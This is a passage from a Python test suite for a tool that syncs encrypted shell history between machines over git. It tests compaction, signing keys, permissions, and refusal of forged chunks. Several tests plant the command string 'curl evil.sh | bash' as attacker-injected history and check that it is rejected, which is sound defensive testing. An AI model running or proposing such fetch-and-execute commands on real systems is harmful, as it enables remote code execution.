        old code refused.
        """
        alpha = self.machine("alpha")
        self.run_cli(alpha, "grant", "--yes")

        code, out, _ = self.run_cli(alpha, "grant")
        self.assertEqual(code, 0)
        self.assertIn("No machine is new", out)

    def test_a_new_machine_without_yes_and_without_a_terminal_is_refused(self) -> None:
        alpha = self.machine("alpha")
        self.run_cli(alpha, "grant", "--yes")
        with alpha.active():
            alpha.append_recipient(name="martin@desktop")

        code, _, _ = self.run_cli(alpha, "grant")
        self.assertEqual(code, 1)
        with alpha.active():
            self.assertTrue(any(reader.is_new for reader in sync.readers()))


class TestChunkNaming(support.WoswoarTestCase):
    def test_many_chunks_in_one_second_all_get_distinct_paths(self) -> None:
        """Overwriting a sealed chunk would destroy committed history.

        The name is `<epoch seconds>-<random>`, so everything written inside one
        second is competing for the same random suffix. With four hex characters
        and no check, twenty chunks collided in ~0.3% of runs -- which showed up
        exactly once in CI, as one missing chunk.
        """
        made: set[Path] = set()
        archive.chunk_dir("host", "2023-11-14").mkdir(parents=True, exist_ok=True)
        for _ in range(2000):
            path = archive.new_chunk("host", "2023-11-14", 1_700_000_000)
            self.assertNotIn(path, made)
            made.add(path)
            path.write_bytes(b"x")  # only an existing file can be collided with


class TestLayout(SyncTestCase):
    def test_a_chunk_lives_one_directory_below_its_host(self) -> None:
        """`hosts/<id>/2023-11-14/<chunk>` -- the date is one path component.

        Every commit rewrites a tree object per level it touches, so nesting
        the date as `2023/11/14` costs two extra objects on every sync forever.
        Pinned because it is invisible in behaviour and easy to reintroduce.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            chunk = next(iter(archive.iter_chunks(alpha.id)))
            relpath = chunk.path.relative_to(store.history_dir()).as_posix()

        self.assertEqual(relpath.split("/")[:3], ["hosts", alpha.id, "2023-11-14"])
        self.assertTrue(archive.is_chunk_path(relpath), relpath)

    def test_sealed_history_is_smaller_than_the_plaintext_it_carries(self) -> None:
        """A day's worth of one machine's commands, compacted into one chunk.

        Without compression the sealed form is strictly *larger* than the
        plaintext -- age adds a header and encrypts. This asserts the whole
        point of packing the payload first, on input shaped like real history.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            # Two syncs, not sixty: `compact` only needs more than one chunk to
            # merge, and each extra sync is a fetch, a rebase, a push and an
            # `age` spawn for no additional coverage.
            for i in range(60):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"git commit -m 'feature {i % 7}'")
                if i == 29:
                    sync.run()
            sync.run()
            plaintext = store.log_file(alpha.id, "2023-11-14").stat().st_size
            sync.compact(before="2023-11-15")
            sealed = sum(c.path.stat().st_size for c in archive.iter_chunks(alpha.id))

        self.assertLess(sealed, plaintext // 2, f"sealed={sealed} plaintext={plaintext}")


class TestCompact(SyncTestCase):
    def test_compact_merges_chunks_and_preserves_content(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(5):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            before = len(list(archive.iter_chunks(alpha.id)))
            self.assertEqual(before, 5)

            days, replaced, _ = sync.compact(before="2023-11-15")
            self.assertEqual((days, replaced), (1, 5))
            self.assertEqual(len(list(archive.iter_chunks(alpha.id))), 1)

    def test_a_before_in_the_future_is_refused(self) -> None:
        """Issue #69: the only trigger that repeats indefinitely.

        `--before 2099-01-01` takes in today and every day after it, and those
        days keep gaining chunks -- so each is a day whose local copy peers must
        rebuild every time it grows. A day compacted while still being written
        reaches ~1440 chunks. There is no case where asking for it is the intent.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            # Two syncs, so the day has two chunks: compacting a day that holds
            # one is a no-op, and would prove nothing about the guard.
            for i, cmd in enumerate(("git status", "make -j8")):
                alpha.record("2023-11-14", 1_700_000_001 + i, cmd)
                sync.run()
            before = {c.name for c in archive.iter_chunks(alpha.id)}

        with alpha.active():
            with self.assertRaises(errors.SyncError) as refused:
                sync.compact(before="2099-01-01")
            self.assertIn("in the future", str(refused.exception))
            self.assertEqual({c.name for c in archive.iter_chunks(alpha.id)}, before)

            # A finished day is still fine, so the guard is on the future and
            # not on the flag.
            self.assertEqual(sync.compact(before="2023-12-01")[0], 1)

    def test_the_default_leaves_today_alone(self) -> None:
        """`compact()` with no argument means "days that are finished".

        Today is still being written, so compacting it produces exactly the day
        whose local copy every peer rebuilds each time it grows -- the case #69
        is about, reached without passing any flag at all.
        """
        alpha = self.machine("alpha")
        today = store.day_for(int(time.time()))
        with alpha.active():
            for i in range(2):
                alpha.record(today, 1_700_000_001 + i, f"today {i}")
                sync.run()
                alpha.record("2023-11-14", 1_700_000_001 + i, f"finished {i}")
                sync.run()
            live = {c.name for c in archive.iter_chunks(alpha.id) if c.day == today}

            self.assertEqual(sync.compact()[0], 1, "the finished day was not compacted")
            self.assertEqual(
                {c.name for c in archive.iter_chunks(alpha.id) if c.day == today},
                live,
                "the default compacted a day still being written",
            )

    def test_compacted_chunk_still_reaches_another_machine(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            for i in range(3):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            sync.compact(before="2023-11-15")
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"command 0", "command 1", "command 2"})


class TestSigningStatus(SyncTestCase):
    """The other half of what `doctor` says about this machine's keys.

    `TestIdentityStatus` below has covered its neighbour since #201; this had
    nothing. A whole-package mutation run put 13 survivors in this one function
    -- every failure branch could `return None` and the suite stayed green --
    which is the same shape `tests/test_manifest.py` was written for: a `doctor`
    verdict a user reads, on a path where the machine keeps recording, looks
    healthy, and publishes history no peer will ever accept.
    """

    def test_a_healthy_signing_key_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            status = sync.signing_status(store.machine())
            self.assertTrue(status.ok, status.detail)
            self.assertIn(str(store.signing_key_file()), status.detail)

    def test_a_missing_signing_key_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            store.signing_key_file().unlink()
            status = sync.signing_status(store.machine())
            self.assertIs(status.ok, False)
            self.assertIn("missing", status.detail)
            self.assertIn("woswoar init", status.detail)

    def test_a_key_that_signs_but_does_not_verify_is_reported(self) -> None:
        """The failure the round trip exists for.

        Not "the file is absent" and not "signing raised" -- a key that produces
        a signature this machine then refuses. Forced by making the round trip
        answer False, because manufacturing a real one means corrupting
        ssh-keygen's own output in a way it would reject earlier.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            with mock.patch.object(manifest, "signs_and_verifies", return_value=False):
                status = sync.signing_status(store.machine())
            self.assertIs(status.ok, False)
            self.assertIn("does not verify", status.detail)

    def test_a_key_that_cannot_sign_at_all_is_reported(self) -> None:
        """`WoswoarError` out of the round trip, not an escape."""
        alpha = self.machine("alpha")
        with alpha.active():
            boom = errors.WoswoarError("ssh-keygen said no")
            with mock.patch.object(crypto, "signing_public", side_effect=boom):
                status = sync.signing_status(store.machine())
            self.assertIs(status.ok, False)
            self.assertIn("cannot sign", status.detail)
            self.assertIn("ssh-keygen said no", status.detail)

    def test_no_ssh_keygen_at_all_is_reported(self) -> None:
        """The branch a machine without ssh-keygen takes.

        Patched rather than skipped: every machine that runs this suite has
        ssh-keygen (`requires_ssh_keygen`), so the branch is unreachable here by
        construction and would otherwise never be executed anywhere.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            with mock.patch.object(crypto, "signing_available", return_value=False):
                status = sync.signing_status(store.machine())
            self.assertIs(status.ok, False)
            self.assertIn("ssh-keygen is not installed", status.detail)


class TestIdentityStatus(SyncTestCase):
    """The health check `doctor` reports. Testable because it lives in sync."""

    def test_healthy_identity(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            status = sync.identity_status(store.machine())
            self.assertTrue(status.ok, status.detail)

    def test_missing_identity_file_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            known = store.machine()
            Path(known.identity).unlink()
            status = sync.identity_status(known)
            self.assertIs(status.ok, False)
            self.assertIn("missing", status.detail)

    def test_unconfigured_identity_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            status = sync.identity_status(store.machine()._replace(identity=""))
            self.assertIs(status.ok, False)
            self.assertIn("woswoar init", status.detail)

    def test_passphrase_protected_key_is_reported(self) -> None:
        # The failure that only bites unattended: age cannot use ssh-agent, so
        # this key would work by hand and never from a systemd timer.
        alpha = self.machine("alpha")
        with alpha.active():
            locked = self.root / "locked"
            subprocess.run(
                ["ssh-keygen", "-q", "-t", "ed25519", "-N", "hunter2", "-f", str(locked)],
                check=True,
                timeout=60,
            )
            status = sync.identity_status(store.machine()._replace(identity=str(locked)))
            self.assertIs(status.ok, False)
            self.assertIn("passphrase", status.detail)


class TestLocalOnly(SyncTestCase):
    def test_sync_without_a_remote_still_seals(self) -> None:
        alpha = Fake(self.root, "solo")
        with alpha.active():
            sync.initialise(new_identity=True)
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertFalse(report.pushed)

    def test_concurrent_sync_is_refused_not_corrupted(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), sync.lock(), self.assertRaises(errors.SyncError):
            sync.run()


class TestSyncIsPrivate(SyncTestCase):
    def test_a_sync_that_runs_before_install_leaves_nothing_readable(self) -> None:
        """The timer can fire on a machine where `install` never ran.

        Everything sync creates on its own -- the data directory, the lock, the
        state file, a peer's learned name -- has to be owner-only by itself,
        because `install` is the only thing that re-tightens and it may never
        have run here.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            # The harness pre-creates WOSWOAR_DIR, which stands in for a user
            # pointing it at a directory that already existed -- woswoar leaves
            # those alone by design, so start from the state `install` leaves.
            store.harden()
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            exposed = store.readable_by_others()
            self.assertEqual(exposed, [], f"sync left {exposed} readable by others")


class TestASigningKeyThatChanges(SyncTestCase):
    """A machine that starts signing with a different key is never waved through.

    It is either a machine that was re-enrolled after losing its key, or someone
    rewriting the repo to publish as one of your machines. Nothing available to
    a peer can tell those apart, so the peer refuses and says so, and a human
    decides. Silently re-pinning would make the pin worthless: an attacker would
    just publish a new `signer.pub` alongside the history they wanted believed.
    """

    def test_losing_the_signing_key_mints_a_new_one_rather_than_stopping(self) -> None:
        # Recording and publishing must not depend on a file the user could
        # delete; the consequence lands on the peers, loudly, where it can be
        # judged.
        alpha = self.machine("alpha")
        with alpha.active():
            first = crypto.signing_public(store.signing_key_file())
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()

            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertNotEqual(crypto.signing_public(store.signing_key_file()), first)

    def test_a_peer_refuses_the_new_key_and_keeps_the_old_pin(self) -> None:
        alpha, beta = self.enrolled_pair()
        with alpha.active():
            pinned_before = sync.State.load().signers[alpha.id]
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()
            # A new day: days it already signed are frozen under the old key,
            # so publishing there would test nothing about the peer's refusal.
            alpha.record("2023-11-20", 1_700_500_002, "after-the-key-changed")
            self.assertEqual(sync.run(now=1_900_000_000).chunks_written, 1)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.subjects(sync.CHANGED_SIGNER), {alpha.id})
            self.assertNotIn("after-the-key-changed", beta.commands())
            # The old pin survives: a refusal must not quietly become an update.
            self.assertEqual(sync.State.load().signers[alpha.id], pinned_before)

    def test_a_human_can_accept_the_new_key_and_history_flows_again(self) -> None:
        alpha, beta = self.enrolled_pair()
        with alpha.active():
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()
            # A *new* day. Days it already signed are frozen -- see below.
            alpha.record("2023-11-20", 1_700_500_002, "after-the-key-changed")
            sync.run(now=1_900_000_000)

        with beta.active():
            sync.run()
            code, _, _ = self.run_cli(beta, "trust", "--replace", "--yes")
            self.assertEqual(code, 0)
            sync.run()
            self.assertIn("after-the-key-changed", beta.commands())

    def test_days_it_already_signed_are_frozen_by_the_new_key(self) -> None:
        """A consequence worth being plain about rather than discovering.

        The old manifest was signed with the key that is gone, so this machine
        can no longer verify its own record of what it published that day.
        Signing a replacement would disown those chunks; refusing keeps them.
        New days are unaffected, so the machine is not stuck.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before the key changed")
            sync.run()
            store.signing_key_file().unlink()
            store.signing_key_file().with_suffix(".pub").unlink()

            alpha.record("2023-11-14", 1_700_000_002, "same day, new key")
            alpha.record("2023-11-20", 1_700_500_002, "a fresh day")
            report = sync.run(now=1_900_000_000)

        self.assertEqual(report.subjects(sync.UNSIGNABLE), {"2023-11-14"})
        self.assertEqual(report.chunks_written, 1, "the fresh day should still publish")

    def enrolled_pair(self) -> tuple[Fake, Fake]:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
        return alpha, beta


class TestMergedHistoryIsStoredFaithfully(SyncTestCase):
    def test_a_peers_history_lands_verbatim_and_owner_only(self) -> None:
        """Merging must not decode-and-re-encode another machine's log.

        A command can hold bytes that are not valid UTF-8 -- a mistyped paste,
        a filename in another charset -- and the recording machine stored them
        verbatim. Passing them through a lossy decode to fit a text-mode helper
        would silently rewrite history that machine got right.
        """
        alpha = self.machine("alpha")
        raw = b"1700000001\ts1\t~\t0\t5\tgrep \xff\xfe binary\n"
        with alpha.active():
            path = store.log_file(alpha.id, "2023-11-14")
            with store.private_append(path, binary=True) as handle:
                handle.write(raw)
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            landed = store.log_file(alpha.id, "2023-11-14")
            merged = landed.read_bytes()
            mode = landed.stat().st_mode & 0o777
        self.assertEqual(merged, raw, "the peer's bytes were rewritten in transit")
        # Another machine's history is no less private than this machine's, and
        # it lands in the same tree -- so it is created with the same mode.
        self.assertEqual(mode & 0o077, 0, f"merged history landed {oct(mode)}")


class TestChunkAuthenticity(SyncTestCase):
    """Whether one of *this user's* machines wrote a chunk, which age cannot say.

    `recipients.txt` publishes every machine's public key and each day's public
    key sits in the clear beside its sealed half, so anyone who can push to the
    repo can seal a chunk every machine is able to *open*. These pin that being
    able to open it is not the same as being willing to believe it.
    """

    def push_as_attacker(self, write: Callable[[Path], None]) -> None:
        """Do what push access alone allows: no identity, no keys, just the repo."""
        work = self.root / "attacker"
        subprocess.run(
            ["git", "clone", "--quiet", str(self.origin), str(work)], check=True, timeout=60
        )
        write(work)
        for args in (
            ["add", "-A"],
            ["-c", "user.name=x", "-c", "user.email=x@y", "commit", "-q", "-m", COMMIT],
            ["push", "--quiet", "origin", "HEAD"],
        ):
            subprocess.run(["git", "-C", str(work), *args], check=True, timeout=60)

    @staticmethod
    def forged_chunk(
        work: Path,
        host_id: str,
        day: str,
        cmd: str,
        name: str = "9999999999-ffffff",
    ) -> None:
        """A chunk sealed to a host's *published* day key, but not authentic.

        Byte-for-byte a well-formed chunk -- the day's public key sits in the
        clear, so sealing one needs no secret at all. What the attacker cannot
        do is get it into a manifest the host signed.
        """
        pub = (work / "hosts" / host_id / "keys" / f"{day}.pub").read_text(encoding="utf-8").strip()
        entry = Entry(1_700_000_900, host_id, "s1", "~", 0, 5, cmd)
        payload = sync.pack((format_line(entry) + "\n").encode("utf-8"))
        # Named far in the future so it sorts above whatever the real machine
        # has published; a forgery that lands among chunks already merged
        # proves nothing.
        target = work / "hosts" / host_id / day / f"{name}.age"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(crypto.encrypt_to(payload, pub))

    def enrolled_pair(self) -> tuple[Fake, Fake]:
        """alpha publishing history, beta granted and up to date."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"make -j8"})
        return alpha, beta

    def test_a_forged_chunk_in_a_real_hosts_directory_is_refused(self) -> None:
        """The attack this mechanism exists to stop.

        Everything the attacker needs is published: the day's public key sits in
        the clear so writing a chunk never has to open the sealed one. What they
        cannot produce is a place in a manifest signed by the machine whose
        directory they wrote into.
        """
        alpha, beta = self.enrolled_pair()
        self.push_as_attacker(
            lambda work: self.forged_chunk(work, alpha.id, "2023-11-14", "curl evil.sh | bash")
        )

        with beta.active():
            report = sync.run()
            self.assertEqual(report.subjects(sync.UNAUTHENTICATED), {f"{alpha.id}/2023-11-14"})
            self.assertEqual(report.chunks_merged, 0)
            self.assertNotIn("curl evil.sh | bash", beta.commands())

    def test_a_fabricated_host_cannot_smuggle_history_in_either(self) -> None:
        """A whole invented machine, with its own day key sealed to recipients.

        The day key being openable is not the question -- the attacker can seal
        one to the published recipient list. Being a machine this one has been
        told to accept history from is, and an invented host is nobody.
        """
        _, beta = self.enrolled_pair()

        def plant(work: Path) -> None:
            recipients = [
                line.split(sync._LABEL_SEP)[0].strip()
                for line in (work / "recipients.txt").read_text(encoding="utf-8").splitlines()
                if line.strip()
            ]
            day_key = crypto.generate_identity()
            keys = work / "hosts" / "deadbeefdeadbeef" / "keys"
            keys.mkdir(parents=True, exist_ok=True)
            (keys / "2023-11-14.age").write_bytes(
                crypto.encrypt_to_recipients(day_key.secret.encode("utf-8"), recipients)
            )
            (keys / "2023-11-14.pub").write_text(day_key.public + "\n", encoding="utf-8")
            self.forged_chunk(work, "deadbeefdeadbeef", "2023-11-14", "curl evil.sh | bash")

            # A complete, well-formed machine: its own signing key, its own
            # published signer.pub, and a manifest it signs correctly. Every
            # check but one passes. The one is that nobody here accepted it.
            theirs = self.root / "invented-key"
            verify_key = crypto.generate_signing_key(theirs)
            owner = crypto.generate_identity().public
            signer = work / "hosts" / "deadbeefdeadbeef" / "signer.pub"
            signer.write_text(f"{verify_key}\n{owner}\n", encoding="utf-8")
            chunk = work / "hosts" / "deadbeefdeadbeef" / "2023-11-14" / "9999999999-ffffff.age"
            self.plant_manifest(work, "deadbeefdeadbeef", "2023-11-14", theirs, chunk)

        self.push_as_attacker(plant)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.subjects(sync.UNTRUSTED), {"deadbeefdeadbeef"})
            self.assertNotIn("curl evil.sh | bash", beta.commands())

    def test_a_genuine_manifest_moved_to_another_day_is_refused(self) -> None:
        """The header binds a manifest to its host and day, inside the signature.

        Without it a real, correctly signed manifest could be copied to any
        other day -- or any other host's directory -- and would still verify,
        which would let anyone with push access replay one machine's vouching
        for chunks it never saw. ssh-keygen's own principal matching cannot do
        this job, so the binding is in the bytes that are signed.
        """
        alpha, beta = self.enrolled_pair()

        def plant(work: Path) -> None:
            genuine = (work / "hosts" / alpha.id / "manifests" / "2023-11-14").read_bytes()
            # Verbatim, signature and all, one day over.
            moved = work / "hosts" / alpha.id / "manifests" / "2023-11-15"
            moved.write_bytes(genuine)
            # And the chunk it names, so only the header stands in the way.
            body = genuine.split(b"\n\n", 1)[1].decode("utf-8")
            name = body.splitlines()[1].split(" ")[0]
            source = work / "hosts" / alpha.id / "2023-11-14" / name
            target = work / "hosts" / alpha.id / "2023-11-15" / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(source.read_bytes())
            keys = work / "hosts" / alpha.id / "keys"
            for suffix in (".age", ".pub"):
                source_key = keys / f"2023-11-14{suffix}"
                (keys / f"2023-11-15{suffix}").write_bytes(source_key.read_bytes())

        self.push_as_attacker(plant)

        with beta.active():
            report = sync.run()
            self.assertIn(f"{alpha.id}/2023-11-15", report.subjects(sync.UNAUTHENTICATED))

    def test_tampering_with_an_authentic_chunk_is_refused(self) -> None:
        """Flipping bytes in a real chunk must not merely fail to decrypt."""
        alpha, beta = self.enrolled_pair()
        with alpha.active():
            before = {c.name for c in archive.iter_chunks(alpha.id)}
            alpha.record("2023-11-14", 1_700_000_002, "cargo build")
            sync.run(now=2_000_000_000)
            fresh = ({c.name for c in archive.iter_chunks(alpha.id)} - before).pop()

        def flip(work: Path) -> None:
            target = work / "hosts" / alpha.id / "2023-11-14" / fresh
            blob = bytearray(target.read_bytes())
            blob[-1] ^= 0xFF
            target.write_bytes(bytes(blob))

        self.push_as_attacker(flip)

        with beta.active():
            self.assertEqual(sync.run().subjects(sync.UNAUTHENTICATED), {f"{alpha.id}/2023-11-14"})

    def test_a_chunk_listed_by_the_wrong_signer_is_refused_like_an_unlisted_one(self) -> None:
        """ "No manifest" and "manifest signed by someone else" are one answer.

        Anything else is the downgrade: an attacker would simply pick whichever
        shape was treated more leniently. They can generate a signing key freely
        -- what they cannot do is make it the one this machine accepts for that
        host.
        """
        alpha, beta = self.enrolled_pair()

        def plant(work: Path) -> None:
            self.forged_chunk(work, alpha.id, "2023-11-14", "signed-by-a-stranger")
            chunk = work / "hosts" / alpha.id / "2023-11-14" / "9999999999-ffffff.age"
            theirs = self.root / "attacker-key"
            crypto.generate_signing_key(theirs)
            self.plant_manifest(work, alpha.id, "2023-11-14", theirs, chunk)

        self.push_as_attacker(plant)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.subjects(sync.UNAUTHENTICATED), {f"{alpha.id}/2023-11-14"})
            self.assertNotIn("signed-by-a-stranger", beta.commands())

    def test_compact_refuses_to_launder_a_chunk_this_machine_did_not_write(self) -> None:
        """`merge` skips our own host id, so compaction is where this is caught.

        Compaction re-seals and re-signs whatever it merges, then deletes the
        originals -- so a chunk planted under our *own* id would come out
        carrying this machine's own signature, with the evidence gone.
        It has to refuse rather than launder.
        """
        alpha, _ = self.enrolled_pair()
        self.push_as_attacker(
            lambda work: self.forged_chunk(work, alpha.id, "2023-11-14", "planted-under-my-own-id")
        )

        with alpha.active():
            sync.run()  # pulls the planted chunk into alpha's own working tree
            with self.assertRaises(errors.SyncError) as caught:
                sync.compact(before="2023-11-15")
            self.assertIn("refusing to compact", str(caught.exception))
            # And it is still there, not silently dropped.
            self.assertTrue(list(archive.iter_chunks(alpha.id)))


class TestExportWillNotDisownItsOwnHistory(SyncTestCase):
    """A day whose signed list this machine cannot verify is left alone.

    Signing a fresh manifest would drop every chunk published earlier that day
    out of the signed list, and peers would then refuse them -- so a file
    anybody with push access can corrupt would cost you published history.
    """

    def test_a_corrupted_own_manifest_stops_that_day_rather_than_truncating_it(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "published earlier")
            sync.run()
            before = manifest.read(
                alpha.id, "2023-11-14", crypto.signing_public(store.signing_key_file())
            )
            self.assertEqual(len(before), 1)

            archive.day_manifest(alpha.id, "2023-11-14").write_text("wrecked", encoding="utf-8")
            alpha.record("2023-11-14", 1_700_000_002, "published later")
            report = sync.run(now=1_900_000_000)

            self.assertIn("2023-11-14", report.subjects(sync.UNSIGNABLE))
            self.assertEqual(
                report.chunks_written, 0, "a chunk was written with no list to hold it"
            )

    def test_another_day_is_unaffected(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "day one")
            sync.run()
            archive.day_manifest(alpha.id, "2023-11-14").write_text("wrecked", encoding="utf-8")

            # Both days have something to publish, so both are attempted; only
            # the one whose signed list is unreadable is held back. A day with
            # nothing new is never touched at all, corrupt manifest or not.
            alpha.record("2023-11-14", 1_700_000_002, "day one, again")
            alpha.record("2023-11-15", 1_700_100_001, "day two")
            report = sync.run(now=1_900_000_000)
            self.assertEqual(report.chunks_written, 1)
            self.assertEqual(report.subjects(sync.UNSIGNABLE), {"2023-11-14"})


class TestTheMergeWatermark(SyncTestCase):
    """What a machine has merged is a *set*, not a high-water mark.

    A single "highest name seen" cannot express "all but that one", and chunk
    names are only loosely ordered -- two written in the same second differ by a
    random suffix. So a high-water mark gets both of these wrong, in opposite
    directions, depending only on iteration order.
    """

    def alpha_with_two_chunks(self) -> tuple[Fake, Fake, list[archive.Chunk]]:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "first command")
            sync.run(now=1_700_000_500)
            alpha.record("2023-11-14", 1_700_000_002, "second command")
            sync.run(now=1_700_000_600)
            chunks = sorted(archive.iter_chunks(alpha.id), key=lambda c: c.name)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        return alpha, beta, chunks

    def test_a_chunk_that_failed_once_is_retried_rather_than_skipped(self) -> None:
        """The silent half, and the worse one.

        If an earlier-named chunk fails while a later-named one succeeds, a
        high-water mark advances past the failure and that chunk is never looked
        at again -- its commands are simply missing, with nothing said after the
        run in which it failed.
        """
        alpha, beta, chunks = self.alpha_with_two_chunks()
        first, _later = chunks
        original = first.path.read_bytes()

        with alpha.active():
            # Damaged in place: its digest no longer matches the signed
            # manifest, so beta refuses it -- while the later chunk is fine.
            first.path.write_bytes(b"corrupted" + original)
            self.publish_repo_edit()

        with beta.active():
            report = sync.run()
            self.assertTrue(report.subjects(sync.UNAUTHENTICATED))
            self.assertIn("second command", beta.commands())
            self.assertNotIn("first command", beta.commands())

        # Repaired at the source, as a transient failure would be.
        with alpha.active():
            first.path.write_bytes(original)
            self.publish_repo_edit()

        with beta.active():
            sync.run()
            self.assertIn("first command", beta.commands(), "the failed chunk was never retried")

    def test_a_chunk_already_merged_is_not_read_again(self) -> None:
        """The other half: nothing already consumed may be reconsidered.

        A set says this directly. Under a high-water mark it held only because
        every later name happened to sort above every earlier one.
        """
        _alpha, beta, _chunks = self.alpha_with_two_chunks()
        with beta.active():
            self.assertEqual(sync.run().chunks_merged, 2)
            self.assertEqual(sync.run().chunks_merged, 0)
            self.assertEqual(len(cache.load_entries()), 2)


class TestCompactionDoesNotDuplicateOnPeers(SyncTestCase):
    """`compact` replaces a day's chunks with one holding the same lines.

    A peer that already merged the originals must not merge the replacement as
    though it were new. Whether it did used to be a coin flip: the compacted
    chunk carries the timestamp of the last chunk it replaced and a fresh random
    suffix, so it sorted above the old high-water mark about half the time
    (measured 4/10 before this was fixed).
    """

    def merged_entries(self, beta: Fake) -> int:
        with beta.active():
            sync.run()
            return len(beta.entries())

    def test_a_peer_that_already_merged_the_day_gains_nothing(self) -> None:
        # Counted as *entries*, not unique commands: `commands()` is a set, and
        # a set is exactly what hides this. The test that missed this bug for
        # three releases compared sets.
        alpha, beta = self.history_across_days(days=1, per_day=3)
        before = self.merged_entries(beta)
        self.assertEqual(before, 3)

        with alpha.active():
            # The suffix pinned to the highest it can be, so the compacted chunk
            # certainly sorts above the peer's old high-water mark. Left random,
            # this reproduced about half the time -- which is a coin flip, not a
            # regression test.
            with mock.patch("woswoar.store.secrets.token_hex", return_value="ffffff"):
                days, replaced, _ = sync.compact(before="2023-11-15")
            self.assertEqual((days, replaced), (1, 3))
            sync.run(now=1_700_000_900)

        self.assertEqual(self.merged_entries(beta), before, "compaction duplicated merged history")

    def test_a_peer_that_merged_only_part_of_the_day_ends_up_with_all_of_it(self) -> None:
        """The case a high-water mark cannot get right in either direction.

        Skipping the compacted chunk loses the lines the peer never had;
        appending it duplicates the ones it did. Neither is acceptable, so a
        chunk that subsumes others replaces the day rather than adding to it.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_000, "command 0")
            sync.run(now=1_700_000_500)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(len(cache.load_entries()), 1)

        # beta is away while alpha records more and then compacts the day.
        with alpha.active():
            for i in (1, 2):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run(now=1_700_000_500 + i)
            sync.compact(before="2023-11-15")
            sync.run(now=1_700_000_900)

        with beta.active():
            sync.run()
            entries = cache.load_entries()
        self.assertEqual(len(entries), 3, "beta should hold each command exactly once")
        self.assertEqual({e.cmd for e in entries}, {"command 0", "command 1", "command 2"})

    def test_a_chunk_sorting_below_the_compacted_one_survives(self) -> None:
        """A day rewritten by a compacted chunk keeps what that chunk does not hold.

        Chunk names carry the timestamp of the sync that wrote them, and the
        compacted chunk takes the timestamp of the last chunk it replaced -- so
        a chunk written afterwards with an earlier timestamp sorts *below* it and
        is merged first. Discarding what had been accumulated would lose it.
        """
        alpha, beta = self.history_across_days(days=1, per_day=3)
        self.assertEqual(self.merged_entries(beta), 3)

        with alpha.active():
            sync.compact(before="2023-11-15")
            # Named below the compacted chunk, which took ts 1_700_000_502.
            alpha.record("2023-11-14", 1_700_000_009, "written after compaction")
            sync.run(now=1_700_000_400)
            names = sorted(c.name for c in archive.iter_chunks(alpha.id))
        self.assertLess(names[0], names[1], "the fixture no longer builds the case")

        with beta.active():
            sync.run()
            entries = cache.load_entries()
        self.assertEqual(len(entries), 4)
        self.assertIn("written after compaction", {e.cmd for e in entries})


class TestUpgradingFromAHighWaterMark(SyncTestCase):
    """A state file written before the watermark became a set.

    Its `merged` values are single strings, and a string is iterable -- so a
    loader that just iterates them turns one chunk name into twenty-one
    one-character entries, nothing matches, every chunk looks unmerged, and the
    first sync after upgrading duplicates every peer's history. That is the very
    bug this change was made to fix, reintroduced by the fix.
    """

    def test_a_string_watermark_is_discarded_rather_than_read_as_characters(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            store.save_json(
                store.state_file(),
                {"exported": {}, "merged": {"abc/2023-11-14": "1700000000-abcdef.age"}},
            )
            merged = sync.State.load().merged
        self.assertEqual(merged, {}, "the old string was read as a set of characters")

    def test_the_day_is_re_merged_once_and_not_duplicated(self) -> None:
        """Losing the record costs one re-merge, which must not double the day.

